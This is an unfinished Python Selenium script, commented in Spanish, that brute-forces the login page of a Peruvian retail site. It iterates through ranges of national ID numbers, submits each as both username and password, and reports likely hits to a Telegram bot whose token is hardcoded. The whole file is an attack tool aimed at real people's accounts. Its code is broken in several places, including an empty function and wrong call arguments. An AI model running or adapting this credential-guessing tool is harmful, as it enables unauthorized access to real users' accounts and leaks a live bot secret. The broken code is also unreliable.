from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
from selenium.common.exceptions import NoSuchElementException
from os import system
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.common.exceptions import WebDriverException

from selenium.common.exceptions import ElementClickInterceptedException, TimeoutException, ElementNotInteractableException
import time, os, argparse, undetected_chromedriver as uc, requests, threading, random, base64, sys

#from concurrent.futures import ThreadPoolExecutor
from threading import Thread, Barrier
from requests import get
from selenium.webdriver.firefox.options import Options
#from selenium.webdriver.firefox.service import Service
import telegram
from colorama import init,Fore,Back,Style

def inicio():
	

def OperacionMasacre(x):

	#Abriendo el navegador
	#global driver
	firefox_options = Options()
	firefox_options.add_argument('--window-size=800,800')
	#firefox_options.add_argument("--headless")
	driver = webdriver.Firefox(executable_path = "geckodriver.exe", options = firefox_options)
	url = "https://cloudintercorpretail.pe/iniciar-sesion"
	driver.get(url)
	os.system("cls")
	print("\n\n ---->  Cargando...\n")

	wait0 = WebDriverWait(driver,10)
	wait0.until(EC.visibility_of_element_located((By.XPATH,'//*[@id="submit"]')))

	path_ventanaError= '/html/body/div[2]/div/div/snack-bar-container'

	#print(wait0)
	user = x.rstrip()
	p = "pipipipipippiippipipipipipipip¿ipippip¿p"

	wait0.until(EC.visibility_of_element_located((By.XPATH,'//*[@id="username"]')))
	#WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, path_Usuario)))
	#driver.execute_script(f'document.getElementById("username").value={user};')

	#driver.execute_script(f'document.getElementById("password").type={vacio};')
	#driver.execute_script(f'document.getElementById("password").value = "{user}";')
	
	#driver.execute_script(f'document.getElementById("submit").removeAttribute("disabled");')
	#driver.execute_script(f'document.getElementById("submit").click();')
	#driver.find_element(By.XPATH,path_Usuario).clear()
	#driver.find_element(By.XPATH,path_Usuario).send_keys(x.rstrip()) # Poniendo el usuario
	
	driver.find_element(By.XPATH,'//*[@id="username"]').clear()
	driver.find_element(By.XPATH,'//*[@id="username"]').send_keys(user) # Poniendo el usuario

	driver.find_element(By.XPATH,'//*[@id="password"]').clear()
	driver.execute_script(f'document.getElementById("password").type={vacio};')
	driver.find_element(By.XPATH,'//*[@id="password"]').send_keys(user) # Poniendo el usuario

	contador = 0
	while(True):
		try:
			time.sleep(0.1)
			contador = contador + 1
			#wait0.until(EC.visibility_of_element_located((By.XPATH,'//*[@id="submit"]')))
			driver.find_element(By.XPATH ,'//*[@id="submit"]').click()  #Click en ingresar
			wait0.until(EC.visibility_of_element_located((By.XPATH,path_ventanaError))) #esperando ventana roja
			p = driver.find_element(By.XPATH,path_ventanaError).text
			break
		except Exception as e:
			if contador > 100:
				bot.send_message(chat_id=chat_id, text = "Posible: "+ user)
				input("Puede cher"+ user)


	print("-->"+p)
	print("[+] "+ user)
	#input("Next")



if __name__ == '__main__':

	system('mode con: cols=90 lines=60')
	init()
	os.system("cls")

	bot_token = '5689750548:AAHMDwwtLC6_ylkraqLHMO5Bt85HxJRqRF0'
	chat_id = '1850445278'
	bot = telegram.Bot(token=bot_token)

	ip =get("https://api.ipify.org/").text
	#print("your ip :", ip)
	#bot.send_message(chat_id=chat_id, text = "Comenzando oechsle: "+ ip)

	#ipAcceso = ip.find('190.42.48.8') #black
	#ipAcceso = ip.find('190.42.4') #
	#print(ipAcceso)
	ipAcceso = 2
	#if ipAcceso < 0:
		#print(Fore.RED)
		#print("Acceso no autorizado csm")
		#print(ip)

		#input("Enter para cerrar.")
		#input()


	if ipAcceso >= 0:
		#Paths
		path_Usuario ='//*[@id="username"]'
		path_contrasenia= '//*[@id="password"]'
		#id_contrasenia = 'txtPass'
		path_ventanaError= '/html/body/div[2]/div/div/snack-bar-container'

		path_IniciarSesion = '//*[@id="submit"]'

		vacio = "0"
		workers = 3
		pe = True
		os.system("cls")
		print(Fore.GREEN)
		print("   ──▄────▄▄▄▄▄▄▄────▄───")
		print("   ─▀▀▄─▄█████████▄─▄▀▀──") 
		print("   ─────██─▀███▀─██──────")
		print("   ───▄─▀████▀████▀─▄────")
		print("   ─▀█────██▀█▀██────█▀──\n\n")
		print(Fore.CYAN)
		numInicio = 40010337
		numFinal = 50000000
		numInicio = input("Numero Inicial:  ")
		numFinal =  input("Numero Final:    ")
		numero_multi = input("Workesr: ")
		threads = []
		
		#print(Style.RESET_ALL)

		#numInicio = f"{numInicio:08n}"
		#numFinal = f"{numFinal:08n}"
		

		#input("Enter para comenzar")
		#time.sleep(1.5)
		print(Fore.GREEN)
		def proyecto(dni):
			global pe 
			try:
				if pe:
					os.system("cls")
					inicio()
					pe = False
			except Exception as e:
				print("pipu")

			OperacionMasacre(x=str(dni),driver = driver)
			print("-------------------------------------------------------------------------")


		def FunFinal():
			for i in range(int(numInicio),int(numFinal)):
				proyecto(dni = str(i))

		
		
		#Para el bucle		
		for _ in range (int(numero_multi)):
		    i = Thread(target=FunFinal)
		    threads.append(i)
		    i.start()     

		for i in threads:
		    i.join()


		print("Fin Del Programa!!!")

		print('\a')
		time.sleep(1)
		print('\a')
		time.sleep(1)
		print('\a')
		time.sleep(1)
		driver.close()
		input("Enter para cerrar.")




# No acabado

